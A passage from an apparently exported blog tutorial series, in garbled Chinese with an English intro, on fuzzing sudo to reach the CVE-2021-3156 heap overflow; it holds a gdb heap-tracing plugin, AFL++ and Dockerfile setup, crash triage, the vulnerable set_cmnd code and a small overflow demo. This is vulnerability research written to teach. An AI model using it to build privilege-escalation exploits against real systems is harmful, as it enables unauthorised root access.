super(MallocBreakpoint, self).__init__(location, gdb.BP_BREAKPOINT, internal=False) self.silent = True self.size = None self.addr = None return # malloc() breakpoint triggered def stop(self): log = &#123;&#125; # extract information about this malloc() log[&quot;size&quot;] = get_register(&quot;$rdi&quot;) log[&quot;rip&quot;] = get_register(&quot;$rip&quot;) log[&quot;backtrace&quot;] = gdb.execute(&#x27;bt&#x27;, to_string=True) log[&#x27;name&#x27;] = gdb.newest_frame().older().name() # set a breakpoint at the malloc() return if log[&#x27;name&#x27;] and &#x27;set_cmnd&#x27; in log[&#x27;name&#x27;]: self.retbp = MallocReturnBreakpoint(log=log, overwrite=gdb.newest_frame().older()) return False self.retbp = MallocReturnBreakpoint(log=log) return False# breakpoint for the return of a malloc()class MallocReturnBreakpoint(gdb.FinishBreakpoint): def __init__(self, log, overwrite=False, *args, **kwargs): if not overwrite: overwrite = gdb.newest_frame() super(MallocReturnBreakpoint, self).__init__(overwrite, internal=False) self.silent = False self.log = log def stop(self): # extract some information self.log[&#x27;addr&#x27;] = get_register(&quot;$rax&quot;) self.log[&#x27;name&#x27;] = gdb.newest_frame().name() # load the mallocs() we logged before MALLOCS = load() # add this malloc to the known allocations MALLOCS[str(self.log[&#x27;addr&#x27;])] = self.log dump(MALLOCS) # this is the location of our overflowing buffer # now we can dump the heap analysis if self.log[&#x27;name&#x27;] and &#x27;set_cmnd&#x27; in self.log[&#x27;name&#x27;]: print(&quot;YYYYYYYYYYY WE ARE IN!!!&quot;) addr = get_register(&quot;$rax&quot;) mallocs = [int(a) for a in MALLOCS] mallocs.sort() SHOW = 5 out = &#x27;&#x27; for mall in mallocs: if mall &gt; addr and SHOW&gt;0: h = MALLOCS[str(mall)] for line in h[&#x27;backtrace&#x27;].split(&#x27;\\n&#x27;)[1:]: if line: l = line.split() print(l) if l[3] != &#x27;??&#x27;: out += (l[3]) + &quot; &quot; out += &quot;\\n&quot; SHOW -= 1 out += &quot;\\n&quot; print(out) with open(&#x27;/tmp/heap&#x27; ,&#x27;w&#x27;) as f: f.write(out) return True return False# set a breakpoint on free()class FreeBreakpoint(gdb.Breakpoint): def __init__(self, location, *args, **kwargs): super(FreeBreakpoint, self).__init__(location, gdb.BP_BREAKPOINT, internal=False) self.silent = True self.size = None self.malloc = [] self.addr = None return def stop(self): log = &#123;&#125; log[&quot;addr&quot;] = get_register(&quot;$rdi&quot;) # check if the memory freed was allocated before MALLOCS = load() if str(log[&quot;addr&quot;]) in MALLOCS: # remove this object from the list of allocated objects del MALLOCS[str(log[&quot;addr&quot;])] dump(MALLOCS) return False# the gdb command that starts the heap traceclass SudoeditCommand(GenericCommand): &quot;&quot;&quot;Tracks a function given in parameter for arguments and return code.&quot;&quot;&quot; _cmdline_ = &quot;sudoedit&quot; _syntax_ = f&quot;&#123;_cmdline_&#125;&quot; def do_invoke(self, args): dump(&#123;&#125;) self.bkps = [] # set the breakpoints self.bkps.append(MallocBreakpoint(location=&quot;__libc_malloc&quot;)) self.bkps.append(FreeBreakpoint(location=&quot;__libc_free&quot;)) #self.bkps.append(MallocBreakpoint(location=&quot;malloc&quot;)) #self.bkps.append(ReallocBreakpoint(location=&quot;__libc_calloc&quot;)) #self.bkps.append(ReallocBreakpoint(location=&quot;__libc_realloc&quot;)) #self.bkps.append(FreeBreakpoint(location=&quot;free&quot;)) gdb.events.exited.connect(self.cleanup) return def cleanup(self, events): print(&quot;CLEANUP!!!&quot;) for bp in self.bkps: bp.delete() gdb.events.exited.disconnect(self.cleanup) returnif __name__ == &quot;__main__&quot;: register_external_command(SudoeditCommand()) è®¾ç½®æ’ä»¶ 1gdb -ex &#x27;gef config gef.extra_plugins_dir &quot;/pwd/gef2&quot;&#x27; -ex &#x27;gef save&#x27; -ex quit ä½¿ç”¨ 1gdb -ex &#x27;set breakpoint pending on&#x27; -ex &#x27;sudoedit&#x27; -ex &#x27;r -s xxxxxxxxxxxxxxxxxx&#x27; -ex &#x27;sudoedit&#x27; -ex &#x27;continue&#x27; /usr/local/bin/sudoedit | tee heap.log ä¸»è¦å°±æ˜¯è·Ÿè¸ªmallocå’Œfreeåœ¨å †æº¢å‡ºä¹‹åçš„è¡Œä¸º åªæœ‰å°†è¿™ä¸ªæ”¹å†™åˆ°æš´åŠ›è„šæœ¬é‡Œé¢ï¼Œæ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„Chunk","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"SUDOå †æº¢å‡ºææƒï¼šä»fuzzåˆ°exp [2]","slug":"sudo-fuzz2exp-2","date":"2022-04-13T03:12:03.000Z","updated":"2023-06-01T14:24:02.402Z","comments":true,"path":"2022/04/13/sudo-fuzz2exp-2/","link":"","permalink":"https://joe1sn.eu.org/2022/04/13/sudo-fuzz2exp-2/","excerpt":"å‰æ–‡ï¼šhttps://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ å—åˆ°youtuberï¼šLiveOverflowçš„ç³»åˆ—æ•™ç¨‹çš„å¯å‘ï¼Œæˆ‘å‘ç°åœ¨ä¸­æ–‡äº’è”ç½‘ä¸Šå¹¶æ²¡æœ‰ç›¸å…³çš„ç¿»è¯‘æ•™ç¨‹ï¼Œæ‰€ä»¥æˆ‘æƒ³ä»¥å®éªŒæŠ¥å‘Šçš„å½¢å¼æ¥åˆ›é€ è¿™ä¸ªä»fuzzåˆ°expçš„ç³»åˆ—å›¾æ–‡æ•™ç¨‹ åŸå§‹è§†é¢‘åˆé›†ï¼šhttps://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx åŸå§‹Blogï¼šhttps://liveoverflow.com/why-pick-sudo-research-target-part-1/ åŸä½œè€…ä»£ç ä»“åº“ï¼šhttps://github.com/LiveOverflow/pwnedit","text":"å‰æ–‡ï¼šhttps://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ å—åˆ°youtuberï¼šLiveOverflowçš„ç³»åˆ—æ•™ç¨‹çš„å¯å‘ï¼Œæˆ‘å‘ç°åœ¨ä¸­æ–‡äº’è”ç½‘ä¸Šå¹¶æ²¡æœ‰ç›¸å…³çš„ç¿»è¯‘æ•™ç¨‹ï¼Œæ‰€ä»¥æˆ‘æƒ³ä»¥å®éªŒæŠ¥å‘Šçš„å½¢å¼æ¥åˆ›é€ è¿™ä¸ªä»fuzzåˆ°expçš„ç³»åˆ—å›¾æ–‡æ•™ç¨‹ åŸå§‹è§†é¢‘åˆé›†ï¼šhttps://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx åŸå§‹Blogï¼šhttps://liveoverflow.com/why-pick-sudo-research-target-part-1/ åŸä½œè€…ä»£ç ä»“åº“ï¼šhttps://github.com/LiveOverflow/pwnedit My previous blog: https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ I was inspired by the LiveOverflowâ€™s Sudo Vulnerability Walkthrough on youtube, but i found thereâ€™s no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this â€œfrom fuzz to exploitâ€ series. Original Videos: https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx Original Blog: https://liveoverflow.com/why-pick-sudo-research-target-part-1/ Source Project Code: https://github.com/LiveOverflow/pwnedit æœ¬èŠ‚å†…å®¹ï¼š Troubleshooting AFL Fuzzing Problems | Ep. 03 Finding Buffer Overflow with Fuzzing | Ep. 04 Found a Crash Through Fuzzing? Minimize AFL Testcases! | Ep. 05 Root Cause Analysis With AddressSanitizer (ASan) | Ep. 06 Understanding C Pointer Magic Arithmetic | Ep. 07 C Code Review - Reaching Vulnerable Code in sudo | Ep. 08 è§£å†³AFLçš„å°éº»çƒ¦ å› ä¸ºæ—¶é—´åŸå› ï¼Œæˆ‘å¹¶ä¸èƒ½ä¸€ç›´å¼€ç€ç”µè„‘è·‘ï¼Œä¸è¿‡æˆ‘ç¿»è¯‘ä¸€ä¸‹ä½œè€…é‡åˆ°çš„é—®é¢˜ No more free CPU cores ä½œè€…åœ¨é‡åˆ°fuzzå¾ˆæ…¢çš„æ—¶å€™ï¼Œå°è¯•å…³é—­ä¸€ä¸ªfuzzï¼Œç„¶åé‡å¯ ç„¶åä½¿ç”¨ps auxäº§çœ‹å…¨éƒ¨è¿è¡Œè¿‡ç¨‹ï¼Œå‘ç°aflåœ¨å°è¯•fuzzè¿™äº›å¥‡æ€ªçš„ä¸œè¥¿ï¼ˆå› ä¸ºsudoä¸­å¯èƒ½ä¼šæœ‰execä¹‹ç±»çš„ï¼‰ã€‚ç„¶åpkill viå…³é—­æ‰€æœ‰viçš„è¿›ç¨‹å°±çŸ­æš‚çš„è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚ **è§£å†³ï¼š**å½»åº•è§£å†³çš„è¯è¦å…³é—­æ‰€æœ‰åœ¨sudoä¸­çš„execç›¸å…³å‡½æ•°ï¼Œç„¶åé‡æ–°ç¼–è¯‘ And of Disk Space ä½œè€…æŸ¥çœ‹ç©ºé—´ä½¿ç”¨æƒ…å†µè¿‡åå‘ç°ç£ç›˜ç©ºé—´å……è¶³ï¼Œä½†æ˜¯ä»»ç„¶ä¸èƒ½åˆ›å»ºæ–‡ä»¶ ä½†æ˜¯ä½¿ç”¨df -iæŸ¥çœ‹inodeèŠ‚ç‚¹ï¼Œå‘ç°è¢«å æ»¡äº† **inode (index node)**æ˜¯æŒ‡åœ¨è®¸å¤šâ€œç±»Unixæ–‡ä»¶ç³»ç»Ÿâ€ä¸­çš„ä¸€ç§æ•°æ®ç»“æ„ï¼Œç”¨äºæè¿°æ–‡ä»¶ç³»ç»Ÿå¯¹è±¡ï¼ˆåŒ…æ‹¬æ–‡ä»¶ã€ç›®å½•ã€è®¾å¤‡æ–‡ä»¶ã€socketã€ç®¡é“ç­‰ï¼‰ã€‚æ¯ä¸ªinodeä¿å­˜äº†æ–‡ä»¶ç³»ç»Ÿå¯¹è±¡æ•°æ®çš„å±æ€§å’Œç£ç›˜å—ä½ç½®[1]ã€‚æ–‡ä»¶ç³»ç»Ÿå¯¹è±¡å±æ€§åŒ…å«äº†å„ç§å…ƒæ•°æ®ï¼ˆå¦‚ï¼šæœ€åä¿®æ”¹æ—¶é—´ï¼‰ ï¼Œä¹ŸåŒ…å«ç”¨æˆ·ç»„ï¼ˆowner ï¼‰å’Œæƒé™æ•°æ® è¯´æ˜æœ‰è¿‡å¤šçš„ç»†å°æ–‡ä»¶ä½¿ç”¨å…‰äº†inodeèŠ‚ç‚¹å·ï¼Œæœ€ååœ¨/var/tmpæ‰¾åˆ°äº†è¿™äº›æ–‡ä»¶ï¼ŒåŸå› æ˜¯fuzzçš„æ—¶å€™äº§ç”Ÿäº†ä¾‹å¦‚../../çš„è·¯å¾„ç©¿è¶Šã€‚ **è§£å†³ï¼š**æ‰‹åŠ¨åœ¨sudoè¦åˆ›å»ºæ–‡ä»¶çš„æ—¶å€™æ·»åŠ ä¸Šä¸€ä¸ªcrashï¼Œè¿™é‡Œç”¨ç©ºæŒ‡é’ˆå¼•ç”¨ 12printf(&quot;mk tmp file(%s)\\n&quot;,stuff);*(int *)0=0; ä¹‹åå¼€å§‹fuzz ç„¶ååˆ†æcrash ä½†æ˜¯åˆå¼•å…¥äº†æ–°çš„é—®é¢˜ï¼š rootå’Œæ™®é€šç”¨æˆ·ç›¸åŒå—ï¼Ÿ è¿™é‡Œå°±è¦è¯´åˆ°sudoçš„åŸç†ï¼Œsudoæ˜¯é€šè¿‡åœ¨rootæ¡ä»¶ä¸‹ä½¿ç”¨setuidçš„æ–¹å¼æ¥è®©æ™®é€šç”¨æˆ·æŒ‡ä»¤å¾—åˆ°rootæ‰§è¡Œã€‚ æ¯”å¦‚æˆ‘ä»¬åœ¨userä¸‹fuzzï¼Œä½†æ˜¯çœŸå®æƒ…å†µä¼šå°†å®ƒå˜ä¸ºrootä¸‹è¿è¡Œ å¦‚æœè¦åœ¨fuzzæ—¶å®ç°çœŸå®æƒ…å†µçš„æ•ˆæœï¼Œé‚£ä¹ˆå°±è¦å°†å½“å‰ç”¨æˆ·uidè®¾ç½®ä¸ºæ™®é€šç”¨æˆ·çš„ sudo-1.8.31p2/src/sudo.c get_user_info 1234ud-&gt;uid = 1000//getuid();ud-&gt;euid = geteuid();ud-&gt;gid = 1000//getgid();ud-&gt;egid = getegid(); å¿˜å†™åˆ†å·äº† æ‰¾åˆ°ç¼“å†²åŒºæº¢å‡º ä½œè€…ç”¨ä¸Šä¸€èŠ‚çš„fuzzå¾—åˆ°äº†ä¸€äº›ctashæ ·æœ¬ï¼Œæœ¬ç« å†…å®¹è®²çš„åŸºæœ¬ä¸Šæ˜¯åˆ†æè¿™äº›æ ·æœ¬ gdbè°ƒè¯• å’Œæˆ‘é¢„æ–™çš„ä¸€æ ·ï¼Œè¿™æ ·åšä¼šäº§ç”Ÿå¤§é‡çš„ésudoä»è€Œcrashçš„æ ·æœ¬ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ 12grep -R sudoedit file_floder/grep -R sudo file_floder/ ä¸ºäº†æ–¹ä¾¿åˆ†æï¼Œå¯ä»¥å®‰è£…ä¸€äº›gdbçš„æ’ä»¶ï¼Œå¦‚pwndbgï¼Œä¹Ÿåœ¨CVEåˆ†æçš„æ–‡ç« é‡Œè®²è¿‡äº†è¯¥æ’ä»¶çš„å®‰è£…(ä¸è¦æ”¾åœ¨å…±äº«æ–‡ä»¶å¤¹/pwdä¸‹å®‰è£…) æœ‰çš„crashæ˜¯ç”±äºfuzzerçš„é”™è¯¯å¼•èµ·çš„ï¼Œä½œè€…ä½¿ç”¨äº†è¿™æ®µä»£ç åˆ¤æ–­ 1234567#include &quot;argv-fuzz-inl.h&quot;int main(int argc, char *argv[], char *envp[])&#123; AFL_INIT_ARGV(); // argv is now the fake argv execve(&quot;/usr/local/bin/sudo&quot;, argv, envp);&#125; ä½œè€…é‡åˆ°çš„ç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯argv-fuzz-inlä¸­çš„retæ•°ç»„é€ æˆçš„æ ˆæº¢å‡ºï¼Œè¦†å†™äº†å…¶ä»–çš„å‡½æ•°æŒ‡é’ˆé€ æˆcrash è§£å†³ å¦‚æœrcæ¯”æœ€å¤§å‚æ•°æ•°é‡å¤§æ—¶é€€å‡ºå¾ªç¯ æ›´æ¢fuzzer ä½¿ç”¨æ›´å¥½çš„fuzzerï¼šAFL++ é¡¹ç›®åœ°å€ï¼šhttps://github.com/AFLplusplus/AFLplusplus AFL++æ”¯æŒå¯¹å‘½ä»¤è¡Œçš„fuzzï¼Œæ‰€ä»¥ä¹‹å‰çš„ä¿®æ”¹è¦å»æ‰ è¦æ–°å»ºé•œåƒçš„è¯ï¼Œå¯ä»¥åœ¨Dockerfileä¸­åŠ ä¸Š 1RUN cd /root/ &amp;&amp; git clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplus &amp;&amp; make source-only &amp;&amp; make install 1234567891011FROM ubuntu:20.04ENV LC_CTYPE C.UTF-8ARG DEBIAN_FRONTEND=noninteractiveRUN apt-get update &amp;&amp; apt-get install -yq gcc make wget curl git vim gdb clang llvm lld llvm-dev bsdmainutils libstdc++-10-dev python3 python3-pip python3-dev automake flex bison build-essential libglib2.0-dev libpixman-1-dev python3-setuptools RUN cd /root/ &amp;&amp; wget https://www.sudo.ws/dist/sudo-1.8.31p2.tar.gz &amp;&amp; tar -xvf sudo-1.8.31p2.tar.gz &amp;&amp; cd sudo-1.8.31p2 &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make installRUN cd /root/ &amp;&amp; git clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplus &amp;&amp; make source-only &amp;&amp; make installRUN useradd -ms /bin/bash userRUN echo &#x27;export PS1=&quot;\\[\\e]0;\\u@\\h: \\w\\a\\]\\[\\033[01;31m\\]\\u\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]# &quot;&#x27; &gt;&gt; /root/.bashrcRUN echo &#x27;export PS1=&quot;\\[\\e]0;\\u@\\h: \\w\\a\\]\\[\\033[01;32m\\]\\u\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]$ &quot;&#x27; &gt;&gt; /home/user/.bashrcUSER userWORKDIR /home/user é‡æ–°ç¼–è¯‘ 123whereis afl-clang-fastls -lah /usr/local/bin/afl-clang-fastCC=afl-cc ./configure --disable-shared &amp;&amp; make -j8 å¼€å§‹fuzzï¼ŒæŒ‡ä»¤-Tå‚æ•°å¯ä»¥æŒ‡å®šargv[0] 1afl-fuzz -i /tmp/in/ -o /tmp/out/ -T sudoedit ./src/sudo æˆ‘è¿™é‡Œæ•…æ„æ”¾äº†èƒ½å¤Ÿå¼•èµ·crashçš„æ ·æœ¬è¿›å»åªä¸ºäº†åŠ é€Ÿè¿‡ç¨‹ åˆ†ææ–°çš„crash åˆ¤æ–­æ˜¯å¦ä¸ºè¯¯æŠ¥ æˆ‘ç›´æ¥ä½¿ç”¨ä½œè€…çš„crashæ–‡ä»¶ï¼Œä½ å¯ä»¥åœ¨ï¼šhttps://github.com/LiveOverflow/pwnedit/tree/main/episode05 ä¸­æ‰¾åˆ° id_000000,sig_06,src_000083+000451,time_23448104,op_splice,rep_8 â€‹ æ£€éªŒä¸‹åœ¨æˆ‘çš„ç¯å¢ƒé‡Œé¢æ˜¯å¦ä¼šæœ‰crash root user gdbè°ƒè¯• åŸè§†é¢‘é‡Œé¢ç”¨çš„æ˜¯GEFï¼Œè¿™é‡Œæˆ‘ç”¨pwndbgï¼Œæ–°äºº(æ²¡æœ‰CTFpwnç»éªŒ)å»ºè®®ç”¨GEF ç¨‹åºè‡ªåŠ¨è¿è¡Œååœæ­¢äº† è¯´æ˜è¿™ä¸ªé”™è¯¯æ˜¯è¢«mallocç»™æŠ›å‡ºçš„ **è¿™ä¼šæ˜¯ä¸€ä¸ªæ–°çš„0dayå—ï¼Ÿ**åœ¨æœ€æ–°å¹³å°ä¸Šæµ‹è¯•åå‘ç°å¹¶ä¸æ˜¯ ç®€åŒ–crash å…¶å®æˆ‘åšåˆ°è¿™ä¸€æ­¥æƒ³åˆ°çš„æ˜¯ç”¨afl-tminï¼Œåæ¥å‘ç°ä½œè€…å°è¯•å…¶ä»–æ–¹æ¡ˆå¤±è´¥åï¼Œæˆ‘å°±ç›´æ¥ç”¨afl-tminäº† åœ¨userä¸‹æ£€éªŒ åˆ›å»ºè½¯é“¾æ¥ 12ln -s /usr/local/bin/sudo 0editls -lah 0edit è¿è¡Œæµ‹è¯• æœ‰è¶£çš„å‘ç° ç»“å°¾æ˜¯xeditè¿™ç§å½¢å¼å°±å¯ä»¥è°ƒç”¨sudoedit ä½¿ç”¨ASANåˆ†ææ¼æ´ asanä¸€ç›´æ˜¯ä¸€ä¸ªå¾ˆæ“è›‹çš„å·¥å…·ï¼Œç»å¸¸æŠ¥é”™ï¼Œä½œè€…ä¹Ÿåœ¨è¿™é‡ŒæŠ¥é”™å¾ˆå¤šï¼Œæˆ‘ä¹Ÿæ˜¯ç›´æ¥å±•ç¤ºæ­£å¸¸ï¼ˆæ­£å¸¸æŠ¥é”™ï¼‰åšæ³• 1make clean &amp;&amp; ./configure CFLAGS=&quot;-fsanitize=address,undefined -g&quot; LDFLAGS=&quot;-fsanitize=address,undefined&quot; CC=clang --disable-shared &amp;&amp; make -j8 é€å…¥mini_crashæ ·ä¾‹æ£€æµ‹ å¦‚æœæ²¡æœ‰åŠ ä¸Š--disable-sharedçš„è¯ï¼Œå°±ç®—æœ‰-gå‚æ•°ï¼Œä¹Ÿä¸ä¼šçŸ¥é“å…·ä½“ä»£ç åœ¨å“ªé‡Œ ç°åœ¨æˆ‘ä»¬çŸ¥é“æ¼æ´çš„ä½ç½®åœ¨/plugins/sudoers/./sudoers.c:868çš„set_cmndå‡½æ•°å†… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110static intset_cmnd(void)&#123; struct sudo_nss *nss; char *path = user_path; int ret = FOUND; debug_decl(set_cmnd, SUDOERS_DEBUG_PLUGIN) /* Allocate user_stat for find_path() and match functions. */ user_stat = calloc(1, sizeof(struct stat)); if (user_stat == NULL) &#123; sudo_warnx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); debug_return_int(NOT_FOUND_ERROR); &#125; /* Default value for cmnd, overridden below. */ if (user_cmnd == NULL) user_cmnd = NewArgv[0]; if (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; if (ISSET(sudo_mode, MODE_RUN | MODE_CHECK)) &#123; if (def_secure_path &amp;&amp; !user_is_exempt()) path = def_secure_path; if (!set_perms(PERM_RUNAS)) debug_return_int(-1); ret = find_path(NewArgv[0], &amp;user_cmnd, user_stat, path, def_ignore_dot, NULL); if (!restore_perms()) debug_return_int(-1); if (ret == NOT_FOUND) &#123; /* Failed as root, try as invoking user. */ if (!set_perms(PERM_USER)) debug_return_int(-1); ret = find_path(NewArgv[0], &amp;user_cmnd, user_stat, path, def_ignore_dot, NULL); if (!restore_perms()) debug_return_int(-1); &#125; if (ret == NOT_FOUND_ERROR) &#123; if (errno == ENAMETOOLONG) audit_failure(NewArgc, NewArgv, N_(&quot;command too long&quot;)); log_warning(0, &quot;%s&quot;, NewArgv[0]); debug_return_int(ret); &#125; &#125; /* set user_args */ if (NewArgc &gt; 1) &#123; char *to, *from, **av; size_t size, n; /* Alloc and build up user_args. */ for (size = 0, av = NewArgv + 1; *av; av++) size += strlen(*av) + 1; if (size == 0 || (user_args = malloc(size)) == NULL) &#123; sudo_warnx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); debug_return_int(-1); &#125; if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; /* * When running a command via a shell, the sudo front-end * escapes potential meta chars. We unescape non-spaces * for sudoers matching and logging purposes. */ for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123; while (*from) &#123; if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; &#125; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;; &#125; else &#123; for (to = user_args, av = NewArgv + 1; *av; av++) &#123; n = strlcpy(to, *av, size - (to - user_args)); if (n &gt;= size - (to - user_args)) &#123; sudo_warnx(U_(&quot;internal error, %s overflow&quot;), __func__); debug_return_int(-1); &#125; to += n; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;; &#125; &#125; &#125; if ((user_base = strrchr(user_cmnd, &#x27;/&#x27;)) != NULL) user_base++; else user_base = user_cmnd; /* Convert &quot;sudo sudoedit&quot; -&gt; &quot;sudoedit&quot; */ if (ISSET(sudo_mode, MODE_RUN) &amp;&amp; strcmp(user_base, &quot;sudoedit&quot;) == 0) &#123; CLR(sudo_mode, MODE_RUN); SET(sudo_mode, MODE_EDIT); sudo_warnx(U_(&quot;sudoedit doesn&#x27;t need to be run via sudo&quot;)); user_base = user_cmnd = &quot;sudoedit&quot;; &#125; TAILQ_FOREACH(nss, snl, entries) &#123; if (!update_defaults(nss-&gt;parse_tree, NULL, SETDEF_CMND, false)) &#123; log_warningx(SLOG_SEND_MAIL|SLOG_NO_STDERR, N_(&quot;problem with defaults entries&quot;)); &#125; &#125; debug_return_int(ret);&#125; æ¼æ´é€ æˆçš„åŸå› åœ¨CVEé‚£ç¯‡æ–‡ç« åˆ†æè¿‡äº† ç®€åŒ–æ¼æ´æ¨¡å‹ è¿™é‡Œçš„è§†è§’æ›´åƒæ˜¯ç»™CTFå‡ºé¢˜ï¼Œæˆ‘ä¹Ÿç¡®å®ä¸€å¥è¿™ä¸ªæ¼æ´å‡ºè¿‡ä¸€é“ï¼Œä¸è¿‡åœ¨è¿™é‡Œæˆ‘ä»¬åé¢ä¼šå®Œæˆexpçš„ç¼–å†™ï¼Œæ‰€ä»¥åªå†™cç¨‹åºåˆ†æå°±è¡Œäº† ç²¾ç®€ä¸€ä¸‹ä¸Šé¢çš„æºä»£ç ï¼Œé—®é¢˜å‡ºç°åœ¨è¿™é‡Œ 1234567891011if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123; while (*from) &#123; if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; &#125; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;;&#125; å¦‚æœæœ€åä¸€ä¸ªå‚æ•°æ˜¯\\çš„è¯ï¼Œfrom++ï¼Œ ç„¶å*to++ = *from++ï¼Œæ­¤æ—¶çš„fromæŒ‡é’ˆå°±è¶…å‡ºäº†è¾¹ç•Œï¼Œé€ æˆå †æº¢å‡º å¯ä»¥å†™ä¸€ä¸ªå°çš„ä¾‹å­è°ƒè¯•ä¸€ä¸‹ 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;ctype.h&gt;#include &lt;string.h&gt;int main()&#123; char from[100]; puts(&quot;please input some data, max is 100&quot;); read(0,from,100); int len = strlen(from); char *src = from; char *to = (char *)malloc(len); char *dst = to+1; puts(&quot;start copy file&quot;); while(*src)&#123; if (src[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)src[1])) src++; *dst++ = *src++; &#125; *to++ = &#x27;\\n&#x27;; printf(&quot;src&gt; %s&quot;,from); printf(&quot;dst&gt; %s&quot;,to);&#125; æ„é€ è¿™æ ·çš„ç‰¹æ®Šè¾“å…¥ï¼Œåœ¨è¾“å…¥çš„æ—¶å€™å·²ç»è¾“å…¥0x18ä¸ªå­—ç¬¦ä¸²äº†ï¼Œæ‰€ä»¥æ˜¯malloc(0x18) æŒ‰ç…§ç¨‹åºçš„æ•ˆæœï¼Œä¼šå°†ä¸‹ä¸€ä¸ªchunkçš„å¤´éƒ¨ä»½è¦†å†™ä¸º0xbbbbbbbb æˆåŠŸè¦†ç›–æ‰ï¼Œå®ç°é¢„æœŸå †æº¢å‡ºçš„ç›®æ ‡ï¼Œè¯´æ˜å½“ç»“å°¾çš„åæ–œæ åé¢è¿˜æœ‰æ•°æ®çš„æ—¶å€™ä¼šäº§ç”Ÿå †æº¢å‡º","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"SUDOå †æº¢å‡ºææƒï¼šä»fuzzåˆ°exp [1]","slug":"sudo-fuzz2exp-1","date":"2022-04-11T02:40:44.000Z","updated":"2023-08-25T03:10:01.611Z","comments":true,"path":"2022/04/11/sudo-fuzz2exp-1/","link":"","permalink":"https://joe1sn.eu.org/2022/04/11/sudo-fuzz2exp-1/","excerpt":"å‰æ–‡ï¼šhttps://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ å—åˆ°youtuberï¼šLiveOverflowçš„ç³»åˆ—æ•™ç¨‹çš„å¯å‘ï¼Œæˆ‘å‘ç°åœ¨ä¸­æ–‡äº’è”ç½‘ä¸Šå¹¶æ²¡æœ‰ç›¸å…³çš„ç¿»è¯‘æ•™ç¨‹ï¼Œæ‰€ä»¥æˆ‘æƒ³ä»¥å®éªŒæŠ¥å‘Šçš„å½¢å¼æ¥åˆ›é€ è¿™ä¸ªä»fuzzåˆ°expçš„ç³»åˆ—å›¾æ–‡æ•™ç¨‹ åŸå§‹è§†é¢‘åˆé›†ï¼šhttps://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx åŸå§‹Blogï¼šhttps://liveoverflow.com/why-pick-sudo-research-target-part-1/ åŸä½œè€…ä»£ç ä»“åº“ï¼šhttps://github.com/LiveOverflow/pwnedit","text":"å‰æ–‡ï¼šhttps://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ å—åˆ°youtuberï¼šLiveOverflowçš„ç³»åˆ—æ•™ç¨‹çš„å¯å‘ï¼Œæˆ‘å‘ç°åœ¨ä¸­æ–‡äº’è”ç½‘ä¸Šå¹¶æ²¡æœ‰ç›¸å…³çš„ç¿»è¯‘æ•™ç¨‹ï¼Œæ‰€ä»¥æˆ‘æƒ³ä»¥å®éªŒæŠ¥å‘Šçš„å½¢å¼æ¥åˆ›é€ è¿™ä¸ªä»fuzzåˆ°expçš„ç³»åˆ—å›¾æ–‡æ•™ç¨‹ åŸå§‹è§†é¢‘åˆé›†ï¼šhttps://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx åŸå§‹Blogï¼šhttps://liveoverflow.com/why-pick-sudo-research-target-part-1/ åŸä½œè€…ä»£ç ä»“åº“ï¼šhttps://github.com/LiveOverflow/pwnedit My previous blog: https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ I was inspired by the LiveOverflowâ€™s Sudo Vulnerability Walkthrough on youtube, but i found thereâ€™s no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this â€œfrom fuzz to exploitâ€ series. Original Videos: 